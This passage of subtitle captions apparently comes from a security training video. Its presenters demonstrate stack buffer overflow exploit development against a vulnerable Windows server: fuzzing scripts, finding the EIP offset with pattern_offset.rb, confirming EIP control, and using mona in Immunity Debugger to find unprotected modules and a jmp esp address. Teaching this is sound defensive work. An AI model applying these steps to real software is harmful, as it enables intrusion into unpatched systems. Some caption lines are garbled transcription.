00:07:47.066\nAnd I will nano 2futs.py.\n\n159\n00:07:47.066 --> 00:07:47.984\nYeah, that's what I did.\n\n160\n00:07:47.984 --> 00:07:51.385\nYou'll notice that same code,\nno different.\n\n161\n00:07:51.385 --> 00:07:52.920\nTCP-IP port is there.\n\n162\n00:07:52.920 --> 00:07:54.430\nThis is all the same stuff.\n\n163\n00:07:54.430 --> 00:07:55.720\nI changed the attack.\n\n164\n00:07:55.720 --> 00:07:59.480\nIt no longer says a times length.\n\n165\n00:07:59.480 --> 00:08:04.148\nIt is my unique string,\nwhich goes well off the page.\n\n166\n00:08:04.148 --> 00:08:05.733\nIt doesn't word wrap in nano.\n\n167\n00:08:05.733 --> 00:08:09.800\nSo, it's just going off into the distance\nlike a right fielder, right?\n\n168\n00:08:09.800 --> 00:08:12.202\n&gt;&gt; [LAUGH]\n&gt;&gt; He's out there in no man's land.\n\n169\n00:08:12.202 --> 00:08:13.530\nBut that's what that is.\n\n170\n00:08:13.530 --> 00:08:14.225\nThat's, that string.\n\n171\n00:08:14.225 --> 00:08:17.400\nSo now, we can throw this script at it.\n\n172\n00:08:17.400 --> 00:08:20.870\nI like to separate those scripts out,\njust kinda copy and paste or move them.\n\n173\n00:08:21.980 --> 00:08:23.847\nSo, that I don't have to keep rewriting.\n\n174\n00:08:23.847 --> 00:08:26.530\nI can just I can mess with them as I want.\n\n175\n00:08:26.530 --> 00:08:29.153\nIf I need to go back, I don't have\nto do a bunch of code editing.\n\n176\n00:08:29.153 --> 00:08:30.236\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] To make that\n\n177\n00:08:30.236 --> 00:08:31.054\nback the way it was.\n\n178\n00:08:31.054 --> 00:08:34.790\nI still have that one laying around,\nso just copy this one.\n\n179\n00:08:34.790 --> 00:08:35.782\nAll right, let's Ctrl+X.\n\n180\n00:08:35.782 --> 00:08:43.830\nLet us run, don't forget the chmod +\nx on your, if you created a new one.\n\n181\n00:08:43.830 --> 00:08:48.802\nOr if it didn't copy the permissions over,\njust wanna make sure it's executable,\n\n182\n00:08:48.802 --> 00:08:50.423\nand we will do 2fuzz.py.\n\n183\n00:08:50.423 --> 00:08:52.490\nEverything is running,\neverything is running.\n\n184\n00:08:52.490 --> 00:08:53.492\nAll right, we're ready to go.\n\n185\n00:08:53.492 --> 00:08:58.018\nLength of attack, we'll say 3,000,\nit's really, doesn't matter at this point,\n\n186\n00:08:58.018 --> 00:08:59.150\nI could take that out.\n\n187\n00:08:59.150 --> 00:09:01.684\nBut it's sending the data.\n\n188\n00:09:01.684 --> 00:09:05.590\nAnd now it's paused,\nwe've crashed the program successfully.\n\n189\n00:09:05.590 --> 00:09:07.161\nAnd now you don't see a bunch of As.\n\n190\n00:09:07.161 --> 00:09:13.180\nYou'll notice that the term command\nover here is our unique string of data.\n\n191\n00:09:13.180 --> 00:09:17.697\nAnd then also in ESP is more\nof our unique string of data.\n\n192\n00:09:17.697 --> 00:09:21.480\nAnd in EIP, a unique string of data.\n\n193\n00:09:21.480 --> 00:09:22.649\nThis is an important thing.\n\n194\n00:09:22.649 --> 00:09:24.530\nWe need to know this value.\n\n195\n00:09:24.530 --> 00:09:28.675\nSo, that we can find that value\nin the midst of our unique data.\n\n196\n00:09:28.675 --> 00:09:32.549\nCool thing is, guess what, there's\na Ruby script that does that for us and\n\n197\n00:09:32.549 --> 00:09:36.007\nit is built into Kali as I make Mike\nchoke on this water it's funny.\n\n198\n00:09:36.007 --> 00:09:37.533\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n199\n00:09:37.533 --> 00:09:38.513\n&gt;&gt; You guys can't see what's going on\n\n200\n00:09:38.513 --> 00:09:39.074\noff screen, I can.\n\n201\n00:09:39.074 --> 00:09:40.304\nIt's funny.\n\n202\n00:09:40.304 --> 00:09:41.593\nAll right, so we need this.\n\n203\n00:09:41.593 --> 00:09:43.080\nWe need to write this down.\n\n204\n00:09:43.080 --> 00:09:44.269\nThis is an important thing for us.\n\n205\n00:09:44.269 --> 00:09:47.307\nSo whip out your scratch pad,\nmaybe type it in, copy and past it,\n\n206\n00:09:47.307 --> 00:09:48.540\ndo whatever you wanna do.\n\n207\n00:09:49.690 --> 00:09:51.323\nThat's fine.\nI have to be quick to write these\n\n208\n00:09:51.323 --> 00:09:51.880\nthings down.\n\n209\n00:09:51.880 --> 00:09:54.247\nI'm an old school kinda guy when\nit comes to a lot of this stuff.\n\n210\n00:09:54.247 --> 00:09:57.933\nI just write them down cuz it's easier for\nme instead of swiping back and\n\n211\n00:09:57.933 --> 00:10:00.340\nforth or where's my file, where's my file?\n\n212\n00:10:00.340 --> 00:10:01.875\nOpen that up, minimize that.\n\n213\n00:10:01.875 --> 00:10:02.660\nIt's always in the way.\n\n214\n00:10:02.660 --> 00:10:06.930\nA little scratch pad down by the side\ncan help out a lot in that area.\n\n215\n00:10:06.930 --> 00:10:11.530\nSo here, it's gonna be 386F4337.\n\n216\n00:10:11.530 --> 00:10:14.850\nThose are our four hex values, okay?\n\n217\n00:10:14.850 --> 00:10:15.740\nWrite those down.\n\n218\n00:10:16.740 --> 00:10:18.505\nWe're gonna take that back over to Kali.\n\n219\n00:10:18.505 --> 00:10:22.990\nAnd we're gonna say, first,\nwe're gonna kill this.\n\n220\n00:10:22.990 --> 00:10:24.831\nAnd we're going to do another locate.\n\n221\n00:10:24.831 --> 00:10:29.241\nAnd it's going to pattern_,\n\n222\n00:10:29.241 --> 00:10:32.478\nI think it's offset.\n\n223\n00:10:32.478 --> 00:10:34.433\nUnderscore offset.rb,\n\n224\n00:10:34.433 --> 00:10:40.125\nthat it's in the exact same folder how\nabout that, who would have thought?\n\n225\n00:10:40.125 --> 00:10:42.700\nBut if it wasn't, now you know.\n\n226\n00:10:42.700 --> 00:10:47.789\nSo just copy and paste that yet\nagain copy, paste that.\n\n227\n00:10:47.789 --> 00:10:52.874\nThere we go and this time,\nwhat we gonna do is give that EIP value,\n\n228\n00:10:52.874 --> 00:10:55.380\nor we gonna say the same length.\n\n229\n00:10:55.380 --> 00:10:58.600\nSo let's say our length is 3000, and\n\n230\n00:10:58.600 --> 00:11:02.837\noops I'm gonna help if I\ndo -l there we go, 3000.\n\n231\n00:11:02.837 --> 00:11:07.091\nThen we gonna say -q and\ngive it that EIP length.\n\n232\n00:11:07.091 --> 00:11:10.632\nAnd of course, I didn't write it down.\n\n233\n00:11:10.632 --> 00:11:18.109\n386f so, 386f\n&gt;&gt; 4337?\n\n234\n00:11:18.109 --> 00:11:19.573\n&gt;&gt; Was it 4337?\n\n235\n00:11:19.573 --> 00:11:21.004\nLook at you, Mike is amazing.\n\n236\n00:11:21.004 --> 00:11:22.885\n4337 here we go.\n\n237\n00:11:22.885 --> 00:11:23.546\n&gt;&gt; You told me to write it down.\n\n238\n00:11:23.546 --> 00:11:24.394\n[LAUGH]\n&gt;&gt; Yeah, you did and\n\n239\n00:11:24.394 --> 00:11:26.579\nhe follows instructions,\nhe's a good student.\n\n240\n00:11:26.579 --> 00:11:28.243\nAll right, let's see what happens.\n\n241\n00:11:28.243 --> 00:11:29.778\nHit Enter.\n\n242\n00:11:29.778 --> 00:11:30.751\nAway we go.\n\n243\n00:11:30.751 --> 00:11:35.298\nWe're trying to burn,\nexact match of offset at byte 2003.\n\n244\n00:11:35.298 --> 00:11:36.816\nThat's what we need to know.\n\n245\n00:11:36.816 --> 00:11:38.353\nSo what does that mean?\n\n246\n00:11:38.353 --> 00:11:40.320\nCuz it's a little cryptic.\n\n247\n00:11:40.320 --> 00:11:45.520\nWhat it means is, it found that string,\nthat string that we put here, this q.\n\n248\n00:11:45.520 --> 00:11:51.642\nThis that IEP, if found that in\nthat 3000 byte characters right?\n\n249\n00:11:51.642 --> 00:11:56.348\nAnd 3000 by unique strength and\nit said, it's at offset 2003.\n\n250\n00:11:56.348 --> 00:12:00.376\nSo by one, by two,\nby three always are right after by 2003,\n\n251\n00:12:00.376 --> 00:12:02.100\nthat's how we found this.\n\n252\n00:12:02.100 --> 00:12:03.987\nSo, it's 2004, 2005, 2006 and\n\n253\n00:12:03.987 --> 00:12:06.591\n2007 that's stuff four by\nstring that's where it resigns.\n\n254\n00:12:06.591 --> 00:12:09.381\nThat's what we need to know,\nthat's important information.\n\n255\n00:12:09.381 --> 00:12:15.930\nWe have now found where the EIP is\ngetting written to, the exact portion.\n\n256\n00:12:15.930 --> 00:12:18.306\nNow we can set that inside of our code,\n\n257\n00:12:18.306 --> 00:12:22.031\nthat lends to getting us to\nthe end game of the exploit code.\n\n258\n00:12:22.031 --> 00:12:26.300\nAll right, now that that's happening,\nlet me kill this again.\n\n259\n00:12:27.855 --> 00:12:29.823\nAnd restart it.\n\n260\n00:12:29.823 --> 00:12:35.461\nLike I said, a lot of repetitive action\ngoing on with this exploit per-se.\n\n261\n00:12:35.461 --> 00:12:36.945\nRestart immunity.\n\n262\n00:12:36.945 --> 00:12:39.450\nRun as administrator.\n\n263\n00:12:39.450 --> 00:12:40.711\nAttach the file.\n\n264\n00:12:40.711 --> 00:12:42.070\nSee here, attach.\n\n265\n00:12:44.280 --> 00:12:46.155\nAnd vault server, attach.\n\n266\n00:12:46.155 --> 00:12:49.450\nAnd hit play, so it will start.\n\n267\n00:12:49.450 --> 00:12:50.047\nOkay, perfect.\n\n268\n00:12:50.047 --> 00:12:56.540\nNow, we are set up to the third phase\nof our fuzzing, almost to the exploit.\n\n269\n00:12:56.540 --> 00:12:58.319\nWe are so close, it's painful.\n\n270\n00:12:58.319 --> 00:12:59.230\nIt's awesome, right?\n\n271\n00:12:59.230 --> 00:13:03.459\nSo LS, you'll notice I have this\nscript right here, 3fuzz.py.\n\n272\n00:13:03.459 --> 00:13:05.000\nI know, I'm so creative.\n\n273\n00:13:05.000 --> 00:13:07.595\n[LAUGH] I'll nano that one,\nclear the screen, actually.\n\n274\n00:13:07.595 --> 00:13:11.930\nNano 3fuzz.py.\n\n275\n00:13:11.930 --> 00:13:13.961\nAgain, the code is the same.\n\n276\n00:13:13.961 --> 00:13:17.010\nThere's a little difference.\n\n277\n00:13:17.010 --> 00:13:19.585\nYou'll notice we keep navigating and\n\n278\n00:13:19.585 --> 00:13:23.614\nhovering around a certain area\nwhich is right around here.\n\n279\n00:13:23.614 --> 00:13:28.910\nNow, I've created a few new variables.\n\n280\n00:13:28.910 --> 00:13:30.669\nThis is where our code is\nchanging a little bit.\n\n281\n00:13:30.669 --> 00:13:34.130\nSo, it's starting to morph into more\nof an exploit than it is a fuzz.\n\n282\n00:13:34.130 --> 00:13:35.146\nBut this is still a fuzz.\n\n283\n00:13:35.146 --> 00:13:39.670\nBecause now we have an attack,\nwe knew that A will start.\n\n284\n00:13:39.670 --> 00:13:43.591\nBecause I need to start filling\nthe bucket up, so that it will overflow.\n\n285\n00:13:43.591 --> 00:13:46.990\nAnd I know that that happens\nright after byte 2003.\n\n286\n00:13:46.990 --> 00:13:51.776\nSo I'm gonna send 2003 As cuz that-\n&gt;&gt; That\n\n287\n00:13:51.776 --> 00:13:53.580\nshould get you right to\nthe beginning of the EIP.\n\n288\n00:13:53.580 --> 00:13:56.112\n&gt;&gt; Exactly,\nthat's gonna point me right to the EIP.\n\n289\n00:13:56.112 --> 00:13:59.630\nAnd now I wanna make sure\nthat that's the exact spot.\n\n290\n00:13:59.630 --> 00:14:04.115\nYou wanna trust but verify, like old\nRonald Regan used to say it all the time,\n\n291\n00:14:04.115 --> 00:14:05.219\ntrust but verify.\n\n292\n00:14:05.219 --> 00:14:07.650\nSo, we wanna verify that\nwe have the right spot.\n\n293\n00:14:07.650 --> 00:14:09.123\nWe may have to do some shucking and\njiving.\n\n294\n00:14:09.123 --> 00:14:11.482\nMaybe there was,\nwe didn't type something correctly,\n\n295\n00:14:11.482 --> 00:14:13.900\nwe just wannna make sure we're\ngetting in the right zone.\n\n296\n00:14:15.210 --> 00:14:18.161\nSo what I did was, I just created\na variable called EIP right here.\n\n297\n00:14:18.161 --> 00:14:21.590\nI'm gonna make sure you guys\nare seeing that really well.\n\n298\n00:14:21.590 --> 00:14:22.276\nThere we go.\n\n299\n00:14:22.276 --> 00:14:27.212\nJump that up, eip=b,\njust sending four b's.\n\n300\n00:14:27.212 --> 00:14:33.219\nIf I see four b's in my EIP when we send\nthis fuzz, I should be golden, right?\n\n301\n00:14:33.219 --> 00:14:34.310\nI should be gravy.\n\n302\n00:14:34.310 --> 00:14:36.892\nAnd the for the rest of it,\nI'll just send Cs.\n\n303\n00:14:36.892 --> 00:14:40.538\nThat way, if I see Cs in my EIP,\nor if I see As in my EIP,\n\n304\n00:14:40.538 --> 00:14:44.510\nI know that I'm not quite\nin the right zone, right?\n\n305\n00:14:44.510 --> 00:14:45.806\nAnd it helps me out with that.\n\n306\n00:14:45.806 --> 00:14:50.850\nSo that's why I just said, I'll make\na pad of data and I'll make them all Cs.\n\n307\n00:14:50.850 --> 00:14:53.578\nThat way it's different than the As and\nit's different.\n\n308\n00:14:53.578 --> 00:14:55.330\nSo I can get that idea.\n\n309\n00:14:55.330 --> 00:14:56.024\nThat's a good thing.\n\n310\n00:14:56.024 --> 00:15:00.030\nAnd then I just created a buffer, I'm\nbasically adding those things together.\n\n311\n00:15:00.030 --> 00:15:04.879\nAnother variable called buffer, and\nsaying buffer = attack + eip + pad,\n\n312\n00:15:04.879 --> 00:15:05.880\nin that order.\n\n313\n00:15:05.880 --> 00:15:09.170\nAnd then I send that buffer.\n\n314\n00:15:09.170 --> 00:15:10.043\nEasily done, right?\n\n315\n00:15:10.043 --> 00:15:13.670\nYou guys are following me, I know you\nare cuz you're smart people, I can tell.\n\n316\n00:15:13.670 --> 00:15:14.471\nI can sense it.\n\n317\n00:15:14.471 --> 00:15:17.960\nThat's why you're here,\nlistening to what I have to say right now.\n\n318\n00:15:17.960 --> 00:15:19.123\nAll right, let's do that.\n\n319\n00:15:19.123 --> 00:15:20.080\nI've got everything running?\n\n320\n00:15:20.080 --> 00:15:22.309\nYep, our guys running.\n\n321\n00:15:22.309 --> 00:15:24.716\nOkay, and Ctrl+X out of here.\n\n322\n00:15:24.716 --> 00:15:27.839\nAnd let's run that 3fuzz.py.\n\n323\n00:15:27.839 --> 00:15:32.134\nLength of attack like I said, I could\nremove that portion of it at this point\n\n324\n00:15:32.134 --> 00:15:35.218\nbecause we're sending a defined length,\na string.\n\n325\n00:15:35.218 --> 00:15:37.873\nSo, that's really\nsuperfluous at this point.\n\n326\n00:15:37.873 --> 00:15:40.515\nYou can just comment that code\nout if you wanted to, but\n\n327\n00:15:40.515 --> 00:15:42.245\nit doesn't bother anything here.\n\n328\n00:15:42.245 --> 00:15:42.894\nSo, here we go.\n\n329\n00:15:42.894 --> 00:15:43.969\nHit Enter.\n\n330\n00:15:43.969 --> 00:15:45.449\nSends the data.\n\n331\n00:15:45.449 --> 00:15:46.880\nAnd look over here.\n\n332\n00:15:46.880 --> 00:15:48.963\nHere's our EIP.\n\n333\n00:15:48.963 --> 00:15:54.080\nLook at that 424242,\nthat's what we want to see.\n\n334\n00:15:54.080 --> 00:15:55.984\nThat's a good thing.\n\n335\n00:15:55.984 --> 00:16:00.287\nAnd also, ESP, what's it showing me?\n\n336\n00:16:00.287 --> 00:16:01.688\nA bunch of C's.\n\n337\n00:16:01.688 --> 00:16:05.978\nSo I see no C's,\nI don't see any 43s in my EIP.\n\n338\n00:16:05.978 --> 00:16:10.967\nAnd I don't see any 41's on my EIP,\nthat means that a right here\n\n339\n00:16:10.967 --> 00:16:15.503\nover 40 EAS the overflow to\nthe EIP just at the right spur,\n\n340\n00:16:15.503 --> 00:16:20.050\nthat's why they are showing\nour bits are 42's.\n\n341\n00:16:20.050 --> 00:16:27.590\nAnd an ESP register was also written\ninto our pad, which was just all seems.\n\n342\n00:16:27.590 --> 00:16:33.300\nWe are primed and ready to create\nthe final phase of the exploit code.\n\n343\n00:16:33.300 --> 00:16:38.290\nBut it's not just as simple as jumping in\nthere and going hey, do this or do that.\n\n344\n00:16:38.290 --> 00:16:42.120\nWe have to figure out how to make it\nnow that we know where those spots lie,\n\n345\n00:16:42.120 --> 00:16:43.970\nwhere is that stuff?\n\n346\n00:16:43.970 --> 00:16:47.342\nNow we need to give it instructions\nthere instead of just random data.\n\n347\n00:16:47.342 --> 00:16:50.570\nI hope you're following that.\n\n348\n00:16:50.570 --> 00:16:53.980\nWe need to use some of\nthese things over here.\n\n349\n00:16:53.980 --> 00:16:54.700\nLet me zoom out.\n\n350\n00:16:55.730 --> 00:16:56.810\nOf course, it's not showing it.\n\n351\n00:16:56.810 --> 00:16:58.080\nI hate when it does that.\n\n352\n00:16:58.080 --> 00:16:59.400\nBut then let me follow this.\n\n353\n00:16:59.400 --> 00:17:00.510\nMaybe it will show some things.\n\n354\n00:17:02.080 --> 00:17:04.250\nESP I mean, ESP.\n\n355\n00:17:04.250 --> 00:17:04.890\nFollow that and dump.\n\n356\n00:17:06.190 --> 00:17:07.880\nNow it's not giving me any CPU registers.\n\n357\n00:17:07.880 --> 00:17:10.230\nBut remember,\nwe see all this stuff over here.\n\n358\n00:17:10.230 --> 00:17:11.750\nIt has a list of commands.\n\n359\n00:17:11.750 --> 00:17:13.900\nLet's just get that open.\n\n360\n00:17:13.900 --> 00:17:15.040\nIt's crashed anyway, so.\n\n361\n00:17:15.040 --> 00:17:16.020\nWe have to restart it.\n\n362\n00:17:16.020 --> 00:17:19.845\nAnd start immunity.\n\n363\n00:17:19.845 --> 00:17:21.566\nThis administrator.\n\n364\n00:17:21.566 --> 00:17:23.850\nReattach our file.\n\n365\n00:17:23.850 --> 00:17:26.035\nI know, it's a painful process.\n\n366\n00:17:26.035 --> 00:17:28.370\n&gt;&gt; [LAUGH] So really Daniel,\nwhile you're getting that done,\n\n367\n00:17:28.370 --> 00:17:32.420\nI mean, what we've done so far is nothing,\nwell I say nothing more than,\n\n368\n00:17:32.420 --> 00:17:35.350\nit was a big task getting\ndone what we've got done.\n\n369\n00:17:35.350 --> 00:17:38.740\nBut what we've really been doing\nis mapping out the registers\n\n370\n00:17:38.740 --> 00:17:39.900\nthat this program is using.\n\n371\n00:17:39.900 --> 00:17:43.863\nWe're trying to locate everything,\nnothing that we've done is an exploit or\n\n372\n00:17:43.863 --> 00:17:44.893\nattack of any kind.\n\n373\n00:17:44.893 --> 00:17:47.840\nWe're just trying to map everything out.\n\n374\n00:17:47.840 --> 00:17:50.150\nNow we can start planning\nthe actual attack.\n\n375\n00:17:50.150 --> 00:17:50.900\n&gt;&gt; That's right.\n\n376\n00:17:50.900 --> 00:17:54.065\nI mean technically,\nwe denial of serviced it.\n\n377\n00:17:54.065 --> 00:17:55.350\n&gt;&gt; Yes.\n&gt;&gt; Because we've crashed the program.\n\n378\n00:17:55.350 --> 00:17:57.890\nYou can call it that,\nif you wanted to call that a day and\n\n379\n00:17:57.890 --> 00:17:59.480\nsay, I can crash a program.\n\n380\n00:17:59.480 --> 00:18:01.140\nWell, then great, you're off to the races.\n\n381\n00:18:01.140 --> 00:18:02.920\nBut right, I like how Mike put that.\n\n382\n00:18:02.920 --> 00:18:03.900\nWe're mapping it out.\n\n383\n00:18:03.900 --> 00:18:06.190\nWe're mapping out where\nthose registers are.\n\n384\n00:18:06.190 --> 00:18:07.990\nHow many bytes did they hold?\n\n385\n00:18:07.990 --> 00:18:11.200\nAnd how can we overflow them so\nthat we can control them?\n\n386\n00:18:11.200 --> 00:18:12.400\nThat's what we've been doing.\n\n387\n00:18:12.400 --> 00:18:15.900\nAnd now if you look at the screen,\nI got the CPU data backup over here.\n\n388\n00:18:15.900 --> 00:18:18.680\nThese are all, remember, we talked about\nit before, these are all instructions.\n\n389\n00:18:18.680 --> 00:18:22.090\nI need to find a specific\nset of instructions so\n\n390\n00:18:22.090 --> 00:18:23.860\nthat I can make it do those instructions.\n\n391\n00:18:23.860 --> 00:18:27.600\nI wanna put those instructions\nin my exploit code so\n\n392\n00:18:27.600 --> 00:18:31.410\nthat when it overwrites EIP, it's\ninstructions instead of a bunch of b's.\n\n393\n00:18:31.410 --> 00:18:34.520\nAll right, so, let's,\nI'll hit play on that.\n\n394\n00:18:35.910 --> 00:18:36.990\nLet's see, where are we at?\n\n395\n00:18:36.990 --> 00:18:42.370\nWe need to make the EIP instructions\na specific instructions,\n\n396\n00:18:42.370 --> 00:18:43.350\nbecause we want to go.\n\n397\n00:18:43.350 --> 00:18:47.660\nRemember, we overflowed in that ESP area,\nthat's where all our c's ended up.\n\n398\n00:18:47.660 --> 00:18:50.110\nThat's where I wanna put my exploit code.\n\n399\n00:18:50.110 --> 00:18:53.700\nBut I also need to, I can't just\nput my exploit code there, and\n\n400\n00:18:53.700 --> 00:18:56.930\nthis program go hey,\nI found some exploit code, let's run it.\n\n401\n00:18:56.930 --> 00:18:58.640\nI need to tell it to run it.\n\n402\n00:18:58.640 --> 00:19:02.240\nSo we're gonna use the EIP because it\nis the instruction pointer, right.\n\n403\n00:19:02.240 --> 00:19:04.220\nBasically says, do this.\n\n404\n00:19:04.220 --> 00:19:05.200\nHere's the next thing you should do.\n\n405\n00:19:05.200 --> 00:19:07.260\nHere's the next thing you should do.\n\n406\n00:19:07.260 --> 00:19:08.240\nI wanna tell it,\n\n407\n00:19:08.240 --> 00:19:12.395\nthe next thing you should do is look in\nESP and execute whatever you find there.\n\n408\n00:19:12.395 --> 00:19:13.070\n&gt;&gt; [LAUGH]\n&gt;&gt; That's what we wanna do.\n\n409\n00:19:13.070 --> 00:19:15.302\nSo we need to find jmp esp,\n\n410\n00:19:15.302 --> 00:19:20.600\nj-m-p e-s-p that's a set of commands\nIn assembly so that it will do that.\n\n411\n00:19:20.600 --> 00:19:24.222\nI want to jump to the ESP register so\nthat it will execute whatever it finds,\n\n412\n00:19:24.222 --> 00:19:26.246\nwhich will eventually be our shell code.\n\n413\n00:19:26.246 --> 00:19:28.820\nSo how do we do that?\n\n414\n00:19:28.820 --> 00:19:33.360\nWe need to install some modules\ninto immunity right here.\n\n415\n00:19:33.360 --> 00:19:37.190\nLet me show you how to do that,\ncuz it doesn't come pre-installed.\n\n416\n00:19:37.190 --> 00:19:41.230\nIf you go out to the interwebs,\nwhere's my browser here.\n\n417\n00:19:41.230 --> 00:19:45.293\nAnd you go to, let's see here, what is it?\n\n418\n00:19:45.293 --> 00:19:48.671\nIt is GitHub,\n\n419\n00:19:48.671 --> 00:19:58.805\nhttps:\\\\github.com\\corlan\\mona\n\n420\n00:19:58.805 --> 00:20:02.140\nlike that.\n\n421\n00:20:02.140 --> 00:20:04.600\nThat's where you wanna go,\nthis is what we wanna grab.\n\n422\n00:20:04.600 --> 00:20:08.660\nThese are modules, Python modules,\nfor the immunity debugger.\n\n423\n00:20:08.660 --> 00:20:09.870\nAnd they make our lives so much easier,\n\n424\n00:20:09.870 --> 00:20:11.674\nthey help us do these very\nthings that we're trying to do.\n\n425\n00:20:11.674 --> 00:20:15.830\nYou'll notice there is a mona.py,\na nice readme, a license.\n\n426\n00:20:17.010 --> 00:20:21.380\nReally all you need is the mona.py,\nthat's what we wanna grab.\n\n427\n00:20:21.380 --> 00:20:24.610\nAnd it even tells you right here,\nit's very simple to install this.\n\n428\n00:20:24.610 --> 00:20:28.160\nSimply drop mona.py into\nthe PyCommands folder\n\n429\n00:20:28.160 --> 00:20:32.740\ninside the Immunity Debugger folder\nsection, very, very easy, right?\n\n430\n00:20:32.740 --> 00:20:35.960\nSo what you can do is just hit that,\ndownload that, copy that,\n\n431\n00:20:35.960 --> 00:20:36.620\nwhatever you wanna do.\n\n432\n00:20:36.620 --> 00:20:38.140\nGet it to your machine.\n\n433\n00:20:38.140 --> 00:20:40.180\nAnd then, which I did here already.\n\n434\n00:20:40.180 --> 00:20:41.010\nBut I'll show you what to do.\n\n435\n00:20:41.010 --> 00:20:42.710\nLet me shrink this down.\n\n436\n00:20:43.982 --> 00:20:48.651\nIt's like open your file serve,\nlet me have another one.\n\n437\n00:20:48.651 --> 00:20:55.100\nWindows Explorer, go to computer,\nC, program files.\n\n438\n00:20:55.100 --> 00:20:56.240\nThere's Immunity Inc.\n\n439\n00:20:57.730 --> 00:20:58.720\nImmunity Debugger.\n\n440\n00:20:59.740 --> 00:21:01.350\nThen there is the,\nI think it's PyCommands.\n\n441\n00:21:02.650 --> 00:21:03.740\n&gt;&gt; PyCommands.\n&gt;&gt; That's it.\n\n442\n00:21:03.740 --> 00:21:05.170\nPyCommands.\n\n443\n00:21:05.170 --> 00:21:06.870\nAnd then you just drop that right here.\n\n444\n00:21:06.870 --> 00:21:10.770\nYou just copy and paste it into this\nfolder and now you have the Python or\n\n445\n00:21:10.770 --> 00:21:13.020\nthe mona modules working.\n\n446\n00:21:13.020 --> 00:21:16.300\nYou'll have, I think you have to\nrestart Immunity once you're done\n\n447\n00:21:16.300 --> 00:21:17.250\nMaybe you do, I don't know.\n\n448\n00:21:17.250 --> 00:21:18.762\nIf it doesn't work restart it.\n\n449\n00:21:18.762 --> 00:21:20.900\n&gt;&gt; [LAUGH]\n&gt;&gt; If it does great, to the races.\n\n450\n00:21:20.900 --> 00:21:22.540\nAnd there you go.\n\n451\n00:21:22.540 --> 00:21:25.080\nAnd you now have Mona modules.\n\n452\n00:21:25.080 --> 00:21:26.260\nVery simple, very straightforward.\n\n453\n00:21:26.260 --> 00:21:26.970\nThat's what I loved about it.\n\n454\n00:21:26.970 --> 00:21:31.980\nAnd now we're going to use those Mona\nmodules to find that jump command.\n\n455\n00:21:31.980 --> 00:21:35.500\nWhere's a good place that we can\nsteal from to make that happen?\n\n456\n00:21:35.500 --> 00:21:37.280\nThat's what we're gonna do.\n\n457\n00:21:37.280 --> 00:21:40.340\nI can't just say,\nhere's the jump command, jump ESP.\n\n458\n00:21:40.340 --> 00:21:45.700\nThere actually has to be an instruction\nsomewhere that says jumped the ESP.\n\n459\n00:21:45.700 --> 00:21:48.550\nHopefully we can find that, and use that.\n\n460\n00:21:48.550 --> 00:21:53.240\nI just need that four byte piece\nof data of where that might be, so\n\n461\n00:21:53.240 --> 00:21:54.210\nthat we can make that happen.\n\n462\n00:21:55.530 --> 00:21:57.490\nSo let's open up immunity here.\n\n463\n00:21:57.490 --> 00:22:01.090\nThis is where it gets super hinky and\nsuper hard to follow.\n\n464\n00:22:01.090 --> 00:22:04.470\nI myself get twisted around\nhere a lot doing this.\n\n465\n00:22:04.470 --> 00:22:08.010\nSo forgive me if I'm acting strange.\n\n466\n00:22:08.010 --> 00:22:08.910\n&gt;&gt; We'll cut you a little slack.\n\n467\n00:22:08.910 --> 00:22:10.100\n&gt;&gt; Yeah, cut me just a hair of slack.\n\n468\n00:22:10.100 --> 00:22:13.180\nSo I'm definitely gonna follow my\nnotes to the t here cuz it's super\n\n469\n00:22:13.180 --> 00:22:13.920\neasy to get lost.\n\n470\n00:22:14.970 --> 00:22:15.870\nSo we've put in mono.\n\n471\n00:22:15.870 --> 00:22:19.640\nWe need to run the Mona\nmodules down here in immunity.\n\n472\n00:22:19.640 --> 00:22:22.125\nYou have an actual like command\nline area which is cool.\n\n473\n00:22:22.125 --> 00:22:28.930\nAnd we do exclamation point Mona and\nwe wanna look at modules.\n\n474\n00:22:28.930 --> 00:22:30.795\nAll the modules that have been\nloaded up by the bone server.\n\n475\n00:22:30.795 --> 00:22:33.578\nSo mona modules hit return.\n\n476\n00:22:33.578 --> 00:22:38.220\nNow we get a new screen,\nactually a couple new screens.\n\n477\n00:22:38.220 --> 00:22:41.380\nLooking cool,\ngot a lot of stuff going on here.\n\n478\n00:22:41.380 --> 00:22:45.290\nHopefully that's big enough, I think\nit's good enough on the screen there.\n\n479\n00:22:45.290 --> 00:22:47.640\nIf not you guys can pipe in and\nlet me know.\n\n480\n00:22:47.640 --> 00:22:50.254\n&gt;&gt; Can you bump it over a hair to\nthe right the beginning of your command is\n\n481\n00:22:50.254 --> 00:22:51.555\ngetting chopped just a hair.\n\n482\n00:22:51.555 --> 00:22:54.120\n&gt;&gt; Sure.\nLet me make sure I can see what you\n\n483\n00:22:54.120 --> 00:22:55.019\ntyped in.\n\n484\n00:22:55.019 --> 00:22:56.917\nNo, that won't work, that's okay.\n\n485\n00:22:56.917 --> 00:22:57.500\n&gt;&gt; I gotcha.\n\n486\n00:22:57.500 --> 00:22:59.000\n&gt;&gt; There's an exclamation\npoint in front of it.\n\n487\n00:22:59.000 --> 00:23:01.600\n&gt;&gt; There is an exclamation\npoint then mona then modules.\n\n488\n00:23:01.600 --> 00:23:03.620\nI think it's just our bevel.\n\n489\n00:23:03.620 --> 00:23:05.460\n&gt;&gt; Yep.\n&gt;&gt; Cutting it off.\n\n490\n00:23:05.460 --> 00:23:06.820\nAll right, so what's going on here?\n\n491\n00:23:06.820 --> 00:23:10.560\nIt's showing all the modules that\nhave been loaded by bone server.\n\n492\n00:23:10.560 --> 00:23:13.610\nAnd where they reside in memory.\n\n493\n00:23:13.610 --> 00:23:17.120\nWhat's interesting is this\nalso tells us whether or not,\n\n494\n00:23:17.120 --> 00:23:18.980\nremember when we talked about ASLR?\n\n495\n00:23:18.980 --> 00:23:23.310\nBack in the day whether or\nnot it has protections on it?\n\n496\n00:23:23.310 --> 00:23:24.860\nThat is gonna be right here.\n\n497\n00:23:24.860 --> 00:23:29.820\nBasically, what we want in this region is\nfor these to say false cuz it's telling me\n\n498\n00:23:29.820 --> 00:23:35.000\nwhether or not the rebase,\nthe SAFESEH, ASLR,\n\n499\n00:23:35.000 --> 00:23:39.800\nNXCOMPAT, OSD11, all this other stuff,\nis that true or is that false?\n\n500\n00:23:39.800 --> 00:23:41.050\nIs it on or is it off?\n\n501\n00:23:41.050 --> 00:23:42.420\nIf says false, it's off.\n\n502\n00:23:42.420 --> 00:23:43.950\nThere's no protection there.\n\n503\n00:23:43.950 --> 